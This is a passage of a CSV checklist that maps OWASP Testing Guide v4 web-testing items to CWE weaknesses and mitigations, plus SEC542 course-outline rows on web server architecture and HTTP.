outright.",true,https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.md,https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006),https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006),90,true,true,
OTG4-4.08.07,OWASP-TG4,Testing for ORM Injection (OTG-INPVAL-007),,,,,,,4.8 Input Validation Testing,,4.08.07,,,,,,https://www.owasp.org/index.php/Testing_for_ORM_Injection_(OTG-INPVAL-007),91,false,true,
OTG4-4.08.08,OWASP-TG4,Testing for XML Injection (OTG-INPVAL-008),,,Improper Restriction of XML External Entity Reference (XXE),,0,,4.8 Input Validation Testing,,4.08.08,"The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.","PHASE:Implementation System Configuration
DESCRIPTION:Many XML parsers and validators can be configured to disable external entity expansion.",true,https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008),,https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008),611,false,true,
OTG4-4.08.11,OWASP-TG4,Testing for IMAP/SMTP Injection (OTG-INPVAL-011),,,,,,,4.8 Input Validation Testing,,4.08.11,,,,,,https://www.owasp.org/index.php/Testing_for_IMAP/SMTP_Injection_(OTG-INPVAL-011),,false,true,
OTG4-4.08.12,OWASP-TG4,Testing for Code Injection (OTG-INPVAL-012),,,,,,,4.8 Input Validation Testing,,4.08.12,,,,,,https://www.owasp.org/index.php/Testing_for_Code_Injection_(OTG-INPVAL-012),,false,true,
OTG4-4.08.09,OWASP-TG4,Testing for SSI Injection (OTG-INPVAL-009),,,,,,,4.8 Input Validation Testing,,4.08.09,,,,,,https://www.owasp.org/index.php/Testing_for_SSI_Injection_(OTG-INPVAL-009),97,false,true,
OTG4-4.08.10,OWASP-TG4,Testing for XPath Injection (OTG-INPVAL-010),,,,,,,4.8 Input Validation Testing,,4.08.10,,,,,,https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010),643,false,true,
OTG4-4.08.12.02,OWASP-TG4,Testing for Remote File Inclusion,,,,,,,4.8 Input Validation Testing,,4.08.12.02,,,,,,https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion,98,true,true,
OTG4-4.08.13,OWASP-TG4,Testing for Command Injection / RCE (OTG-INPVAL-013),,,Command Injection (RCE),,3,,4.8 Input Validation Testing,,4.08.13,"The software constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.","PHASE:Architecture and Design
DESCRIPTION:If at all possible, use library calls rather than external processes to recreate the desired functionality.

PHASE:Implementation
DESCRIPTION:If possible, ensure that all external commands called from the program are statically created.

PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

PHASE:Operation
DESCRIPTION:Run time: Run time policy enforcement may be used in a whitelist fashion to prevent use of any non-sanctioned commands.

PHASE:System Configuration
DESCRIPTION:Assign permissions to the software system that prevents the user from accessing/opening privileged files.::",true,,,https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013),78,false,true,
OTG4-4.08.14,OWASP-TG4,Testing for Buffer Overflow (OTG-INPVAL-014),,,,,,,4.8 Input Validation Testing,,4.08.14,,,,,,https://www.owasp.org/index.php/Testing_for_Buffer_Overflow_(OTG-INPVAL-014),121,false,true,
OTG4-4.08.14.02,OWASP-TG4,Testing for Stack Overflow,,,,,,,4.8 Input Validation Testing,,4.08.14.02,,,,,,https://www.owasp.org/index.php/Testing_for_Stack_Overflow,121,false,true,
OTG4-4.08.14.03,OWASP-TG4,Testing for Format String,,,,,,,4.8 Input Validation Testing,,4.08.14.03,,,,,,https://www.owasp.org/index.php/Testing_for_Format_String,134,,true,
OTG4-4.08.15,OWASP-TG4,Testing for Incubated Vulnerability (OTG-INPVAL-015),,,,,,,4.8 Input Validation Testing,,4.08.15,,,,,,https://www.owasp.org/index.php/Testing_for_Incubated_Vulnerability_(OTG-INPVAL-015),,,true,
OTG4-4.08.16,OWASP-TG4,Testing for HTTP Splitting/Smuggling (OTG-INPVAL-016),,,,,,,4.8 Input Validation Testing,,4.08.16,,,,,,https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016),113,true,true,
OTG4-4.08.17,OWASP-TG4,Testing for HTTP Incoming requests (OTG-INPVAL-017),,,,,,,4.8 Input Validation Testing,,4.08.17,,,,,,https://www.owasp.org/index.php/Testing_for_HTTP_Incoming_requests_(OTG-INPVAL-017),,,true,
OTG4-4.08.14.01,OWASP-TG4,Testing for Heap Overflow,,,Heap-based Buffer Overflow,,2,,4.8 Input Validation Testing,,4.08.14.01,"A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as malloc().","PHASE:
DESCRIPTION:Pre-design: Use a language or compiler that performs automatic bounds checking.

PHASE:Architecture and Design
DESCRIPTION:Use an abstraction library to abstract away risky APIs. Not a complete solution.

PHASE:Build and Compilation
DESCRIPTION:Pre-design through Build: Canary style bounds checking, library changes which ensure the validity of chunk data, and other such fixes are possible, but should not be relied upon.

PHASE:Implementation
DESCRIPTION:Implement and perform bounds checking on input.

PHASE:Implementation
STRATEGY:Libraries or Frameworks
DESCRIPTION:Do not use dangerous functions such as gets. Look for their safe equivalent, which checks for the boundary.

PHASE:Operation
DESCRIPTION:Use OS-level preventative functionality. This is not a complete solution, but it provides some defense in depth.::",,,,https://www.owasp.org/index.php/Testing_for_Heap_Overflow,122,false,true,
OTG4-4.09.01,OWASP-TG4,Test for Error Code,,,Unchecked Error Condition,,2,,4.9 Testing for Error Handling,,4.09.01,,"PHASE:Requirements
DESCRIPTION:The choice between a language which has named or unnamed exceptions needs to be done. While unnamed exceptions exacerbate the chance of not properly dealing with an exception, named exceptions suffer from the up call version of the weak base class problem.

PHASE:Requirements
DESCRIPTION:A language can be used which requires, at compile time, to catch all serious exceptions. However, one must make sure to use the most current version of the API as new exceptions could be added.

PHASE:Implementation
DESCRIPTION:Catch all relevant exceptions. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment.",true,,,https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001),391,true,true,
OTG4-4.08.12.01,OWASP-TG4,Testing for Local File Inclusion,,,Improper limitation of a pathname to a restricted directory (Path Traversal),,3,,4.8 Input Validation Testing,,4.08.12.01,"The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.","PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.

PHASE:Architecture and Design
DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked. Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59). This includes: realpath() in C getCanonicalPath() in Java GetFullPath() in ASP.NET realpath() or abs_path() in Perl realpath() in PHP

PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.

PHASE:Operation
STRATEGY:Firewall
EFFECTIVENESS:Moderate
DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.

PHASE:Architecture and Design Operation
STRATEGY:Environment Hardening
DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.

PHASE:Architecture and Design
STRATEGY:Enforcement by Conversion
DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.

PHASE:Architecture and Design Operation
STRATEGY:Sandbox or Jail
EFFECTIVENESS:Limited
DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.

PHASE:Architecture and Design Operation
STRATEGY:Attack Surface Reduction
DESCRIPTION:Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately. This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.

PHASE:Implementation
DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success. If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not. In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.

PHASE:Operation Implementation
STRATEGY:Environment Hardening
DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.",true,,,https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion,22,true,true,
OTG4-4.09.02,OWASP-TG4,Testing for Stack Traces (OTG-ERR-002),,,Insecure Configuration,,2,,4.9 Testing for Error Handling,,4.09.02,"The software generates an error message that includes sensitive information about its environment, users, or associated data.","PHASE:Implementation
DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success. If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.

PHASE:Implementation
DESCRIPTION:Handle exceptions internally and do not display errors containing potentially sensitive information to a user.

PHASE:Implementation
STRATEGY:Attack Surface Reduction
EFFECTIVENESS:Defense in Depth
DESCRIPTION:Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.

PHASE:Implementation Build and Compilation
STRATEGY:Compilation or Build Hardening
DESCRIPTION:Debugging information should not make its way into a production release.

PHASE:Implementation Build and Compilation
STRATEGY:Environment Hardening
DESCRIPTION:Debugging information should not make its way into a production release.

PHASE:System Configuration
DESCRIPTION:Where available, configure the environment to use less verbose error messages. For example, in PHP, disable the display_errors setting during configuration, or at runtime using the error_reporting() function.

PHASE:System Configuration
DESCRIPTION:Create default error pages or messages that do not leak any information.",,,,https://www.owasp.org/index.php/Testing_for_Stack_Traces_(OTG-ERR-002),209,true,true,
OTG4-4.10.03,OWASP-TG4,Testing for Sensitive information sent via unencrypted channels (OTG-CRYPST-003),,,,,,,4.10 Testing for Weak Cryptography,,4.10.03,,,,,,https://www.owasp.org/index.php/Testing_for_Sensitive_information_sent_via_unencrypted_channels_(OTG-CRYPST-003),319,,true,
OTG4-4.10.01,OWASP-TG4,"Testing for Weak SSL/TLS Ciphers, Insufficient Transport Layer Protection (OTG-CRYPST-001)",,,"Weak SSL/TLS Ciphers, Insufficient Transport Layer Protection",,2,,4.10 Testing for Weak Cryptography,,4.10.01,"The software stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required.","PHASE:Architecture and Design
DESCRIPTION:Use a cryptographic algorithm that is currently considered to be strong by experts in the field.",true,,,"https://www.owasp.org/index.php/Testing_for_Weak_SSL/TLS_Ciphers,_Insufficient_Transport_Layer_Protection_(OTG-CRYPST-001)",326,true,true,
OTG4-4.10.02,OWASP-TG4,Testing for Padding Oracle (OTG-CRYPST-002),,,,,,,4.10 Testing for Weak Cryptography,,4.10.02,,,,,,https://www.owasp.org/index.php/Testing_for_Padding_Oracle_(OTG-CRYPST-002),327,,true,
OTG4-4.10.04,OWASP-TG4,Testing for Weak Encryption (OTG-CRYPST-004),,,,,,,4.10 Testing for Weak Cryptography,,4.10.04,,,,,,https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004),,false,true,
OTG4-4.11.03,OWASP-TG4,Test integrity checks (OTG-BUSLOGIC-003),,,,,,,4.11 Business Logic Testing,,4.11.03,,,,,,https://www.owasp.org/index.php/Test_integrity_checks_(OTG-BUSLOGIC-003),494,,false,
OTG4-4.11.04,OWASP-TG4,Test for Process Timing (OTG-BUSLOGIC-004),,,,,,,4.11 Business Logic Testing,,4.11.04,,,,,,https://www.owasp.org/index.php/Test_for_Process_Timing_(OTG-BUSLOGIC-004),841,,false,
OTG4-4.11.01,OWASP-TG4,Test business logic data validation (OTG-BUSLOGIC-001),,,,,,,4.11 Business Logic Testing,,4.11.01,,,,,,https://www.owasp.org/index.php/Test_business_logic_data_validation_(OTG-BUSLOGIC-001),841,,false,
OTG4-4.11.02,OWASP-TG4,Test Ability to forge requests (OTG-BUSLOGIC-002),,,,,,,4.11 Business Logic Testing,,4.11.02,,,,,,https://www.owasp.org/index.php/Test_Ability_to_forge_requests_(OTG-BUSLOGIC-002),352,,false,
OTG4-4.11.07,OWASP-TG4,Test defenses against application mis-use (OTG-BUSLOGIC-007),,,,,,,4.11 Business Logic Testing,,4.11.07,,,,,,https://www.owasp.org/index.php/Test_defenses_against_application_mis-use_(OTG-BUSLOGIC-007),,,false,
OTG4-4.11.08,OWASP-TG4,Test Upload of Unexpected File Types (OTG-BUSLOGIC-008),,,,,,,4.11 Business Logic Testing,,4.11.08,,,,,,https://www.owasp.org/index.php/Test_Upload_of_Unexpected_File_Types_(OTG-BUSLOGIC-008),434,,false,
OTG4-4.11.09,OWASP-TG4,Test Upload of Malicious Files (OTG-BUSLOGIC-009),,,,,,,4.11 Business Logic Testing,,4.11.09,,,,,,https://www.owasp.org/index.php/Test_Upload_of_Malicious_Files_(OTG-BUSLOGIC-009),434,,false,
OTG4-4.11.05,OWASP-TG4,Test number of times a function can be used limits (OTG-BUSLOGIC-005),,,,,,,4.11 Business Logic Testing,,4.11.05,,,,,,https://www.owasp.org/index.php/Test_number_of_times_a_function_can_be_used_limits_(OTG-BUSLOGIC-005),,,false,
OTG4-4.11.06,OWASP-TG4,Testing for the Circumvention of Work Flows (OTG-BUSLOGIC-006),,,,,,,4.11 Business Logic Testing,,4.11.06,,,,,,https://www.owasp.org/index.php/Testing_for_the_Circumvention_of_Work_Flows_(OTG-BUSLOGIC-006),,,false,
OTG4-4.12.01,OWASP-TG4,Testing for DOM-based Cross site scripting (OTG-CLIENT-001),,,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),,,,4.12 Client-Side Testing,,4.12.01,The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.,"PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.",,,,https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001),79,true,true,
OTG4-4.12.02,OWASP-TG4,Testing for JavaScript Execution (OTG-CLIENT-002),,,,,,,4.12 Client-Side Testing,,4.12.02,,,,,,https://www.owasp.org/index.php/Testing_for_JavaScript_Execution_(OTG-CLIENT-002),,true,true,
OTG4-4.12.03,OWASP-TG4,Testing for HTML Injection (OTG-CLIENT-003),,,,,,,4.12 Client-Side Testing,,4.12.03,,,,,,https://www.owasp.org/index.php/Testing_for_HTML_Injection_(OTG-CLIENT-003),929,false,true,
OTG4-4.12.06,OWASP-TG4,Testing for Client Side Resource Manipulation (OTG-CLIENT-006),,,,,,,4.12 Client-Side Testing,,4.12.06,,,,,,https://www.owasp.org/index.php/Testing_for_Client_Side_Resource_Manipulation_(OTG-CLIENT-006),,,false,
OTG4-4.12.07,OWASP-TG4,Test Cross Origin Resource Sharing (OTG-CLIENT-007),,,Origin Validation Error,,,,4.12 Client-Side Testing,,4.12.07,,,,,,https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007),346,,false,
OTG4-4.12.08,OWASP-TG4,Testing for Cross site flashing (OTG-CLIENT-008),,,,,,,4.12 Client-Side Testing,,4.12.08,,,,,,https://www.owasp.org/index.php/Testing_for_Cross_site_flashing_(OTG-CLIENT-008),,,false,
OTG4-4.12.09,OWASP-TG4,Testing for Clickjacking (OTG-CLIENT-009),,,,,,,4.12 Client-Side Testing,,4.12.09,,,,,,https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009),731,,false,
OTG4-4.12.10,OWASP-TG4,Testing WebSockets (OTG-CLIENT-010),,,WebSockets Analysis (TODO),,0,,4.12 Client-Side Testing,,4.12.10,,,,,,https://www.owasp.org/index.php/Testing_WebSockets_(OTG-CLIENT-010),0,,false,
OTG4-4.12.11,OWASP-TG4,Test Web Messaging (OTG-CLIENT-011),,,,,,,4.12 Client-Side Testing,,4.12.11,,,,,,https://www.owasp.org/index.php/Test_Web_Messaging_(OTG-CLIENT-011),,,false,
OTG4-4.12.04,OWASP-TG4,Testing for Client Side URL Redirect (OTG-CLIENT-004),,,URL redirection to untrusted site (Open Redirect),,2,,4.12 Client-Side Testing,,4.12.04,"A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.","PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. Use a whitelist of approved URLs or domains to be used for redirection.

PHASE:Architecture and Design
DESCRIPTION:Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.

PHASE:Architecture and Design
STRATEGY:Enforcement by Conversion
DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to /login.asp and ID 2 could map to http://www.example.com/. Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.

PHASE:Architecture and Design
DESCRIPTION:Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).

PHASE:Architecture and Design Implementation
STRATEGY:Attack Surface Reduction
DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls. Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.

PHASE:Operation
STRATEGY:Firewall
EFFECTIVENESS:Moderate
DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.",true,,,https://www.owasp.org/index.php/Testing_for_Client_Side_URL_Redirect_(OTG-CLIENT-004),601,true,false,
EXT-20190314T044458,Extras,Check CSP Headers,,,Insecure Content Security Policy setting,,2,,Extras,,,The software does not properly verify that the source of data or communication is valid.,,true,,,,346,,,
OTG4-4.12.05,OWASP-TG4,Testing for CSS Injection (OTG-CLIENT-005),,,,,,,4.12 Client-Side Testing,,4.12.05,,,,,,https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005),,false,true,
OTG4-4.12.12,OWASP-TG4,Test Local Storage (OTG-CLIENT-012),,,,,,,4.12 Client-Side Testing,,4.12.12,,,,,,https://www.owasp.org/index.php/Test_Local_Storage_(OTG-CLIENT-012),,,false,
OTG4-5.02,OWASP-TG4,Test for Insufficient Logging and Monitoring (not in TG4) (T10-A10),,,,,,,5.0 Extras,,5.02,,,,,,https://www.owasp.org/index.php/Logging_Cheat_Sheet,,true,true,
OTG4-5.01,OWASP-TG4,Test for Deserialization (not in TG4) (T10-A08),,,Deserialization of Untrusted Data,,3,,5.0 Extras,,5.01,The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid.,"PHASE:Architecture and Design Implementation
DESCRIPTION:If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.

PHASE:Implementation
DESCRIPTION:When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe.

PHASE:Implementation
DESCRIPTION:Explicitly define a final object() to prevent deserialization.

PHASE:Architecture and Design Implementation
DESCRIPTION:Make fields transient to protect them from deserialization. An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.

PHASE:Implementation
DESCRIPTION:Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Whitelist acceptable classes. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation.",true,https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization,,https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md,502,true,true,
S542-1.1.01,SEC542,Web Server Arch.: Section Objectives,,,,,,"Describe the various web server architectures and how the attacker views them, and identify and differentiate the different types of web site architectures, what tests can be used to determine a site architecture, what typical environment each architecture is used in and the relative strengths and weaknesses of each architecture.",1. Attacker's view,1.1 Web Server Arch.,B1P01,,,,,,sec542/1.1/index.htm#s1,,,,
S542-1.1.02,SEC542,,,,,,0,,1. Attacker's view,1.1 Web Server Arch.,B1P02,,,,,,sec542/1.1/index.htm#s2,,,,
S542-1.1.03,SEC542,,,,,,,,1. Attacker's view,1.1 Web Server Arch.,B1P03,,,,,,sec542/1.1/index.htm#s3,,,,
S542-1.1.04,SEC542,,,,,,,,1. Attacker's view,1.1 Web Server Arch.,B1P04,,,,,,sec542/1.1/index.htm#s4,,,,
S542-1.1.05,SEC542,Why the web,,,,,,,1. Attacker's view,1.1 Web Server Arch.,B1P05,,,,,,sec542/1.1/index.htm#s5,,,,
S542-1.1.09,SEC542,Understanding the web,,,,,,"Think maliciously, act professionally",1. Attacker's view,1.1 Web Server Arch.,B1P09,,,,,,sec542/1.1/index.htm#s9,,,,
S542-1.1.10,SEC542,Methodology characteristics,,,,,,"Pen Testing methodology has to be Proven, Repeatable to know is something�s been fixed,  Explainable � what was the process to find the flaws?",1. Attacker's view,1.1 Web Server Arch.,B1P10,,,,,,sec542/1.1/index.htm#s10,,,,
S542-1.1.11,SEC542,Knowledge of tools,,,,,,,1. Attacker's view,1.1 Web Server Arch.,B1P11,,,,,,sec542/1.1/index.htm#s11,,,,
S542-1.1.12,SEC542,Permission to test (memo),,,,,,Permission memo at www.counterhack.net/permission_memo.html,1. Attacker's view,1.1 Web Server Arch.,B1P12,,,,,,sec542/1.1/index.htm#s12,,,,
S542-1.1.13,SEC542,,,,,,,,1. Attacker's view,1.1 Web Server Arch.,,,,,,,sec542/1.1/index.htm#s13,,,,
S542-1.1.14,SEC542,Web site server architecture types,,,,,,"In black-box testing, we need to be able to determine architecture types",1. Attacker's view,1.1 Web Server Arch.,B1P14,,,,,,sec542/1.1/index.htm#s14,,,,
S542-1.1.15,SEC542,Web servers,,,,,,"Web Servers are uncommon, simple server without modules such as PHP, static content, can use it for word lists",1. Attacker's view,1.1 Web Server Arch.,B1P15,,,,,,sec542/1.1/index.htm#s15,,,,
S542-1.1.16,SEC542,Hybrid server architecture,,,,,,#NAME?,1. Attacker's view,1.1 Web Server Arch.,B1P16,,,,,,sec542/1.1/index.htm#s16,,,,
S542-1.1.06,SEC542,Security testing is often limited,,,,,,Go to osvdb.org to see large number of web vulnerabilities. XSS information and archive http://xssed.com lists sites found to be vulnerable to web flaws,1. Attacker's view,1.1 Web Server Arch.,B1P06,,,,http://osvdb.org/,http://xssed.com,sec542/1.1/index.htm#s6,,,,
S542-1.1.07,SEC542,Increased functionality with web 2.0,,,,,,,1. Attacker's view,1.1 Web Server Arch.,B1P07,,,,,,sec542/1.1/index.htm#s7,,,,
S542-1.1.08,SEC542,,,,,,,,1. Attacker's view,1.1 Web Server Arch.,,,,,,,sec542/1.1/index.htm#s8,,,,
S542-1.2.01,SEC542,HTTP Protocol: Section Objectives,,,,,,"Discuss the use and key features of HTTP as well as identify the major features of HTTP, know the key fields of HTTP requests and responses, the purpose, use, and misuse of the user-agent field, the various types of query parameters, the origin server and same origin policy, the HTTP methods and any problems with them, what the various HTTP response codes mean and what they can tell an attacker.",1. Attacker's view,1.2 HTTP,B1P20,,,,,,sec542/1.2/index.htm#s1,,,,
S542-1.2.02,SEC542,HTTP Protocol (HTTP 1.1),,,,,,"- RFC 2616. 
- Protocol is stateless. 
- 1.1 provides better caching, bandwidth optimization, designed to be extended if needed. 
- Host header field is important.",1. Attacker's view,1.2 HTTP,B1P21,,,,,,sec542/1.2/index.htm#s2,,,,
S542-1.2.03,SEC542,Example HTTP Request,,,,,,HTTP request format,1. Attacker's view,1.2 HTTP,B1P22,,,,,,sec542/1.2/index.htm#s3,,,,
S542-1.2.04,SEC542,User-Agent,,,,,,"- String to identify client to server. 
- Developers often don't realize that this is User-controllable. 
- Expert-exchange site lets Google index the site and asks other users to pay, based on User-Agent.",1. Attacker's view,1.2 HTTP,B1P23,,,,,,sec542/1.2/index.htm#s4,,,,
S542-1.2.05,SEC542,Example HTTP Response,,,,,,"- Header ends with a blank line. 
- Time of request interesting (if wrong, time zone)...",1. Attacker's view,1.2 HTTP,B1P24,,,,,,sec542/1.2/index.htm#s5,,,,
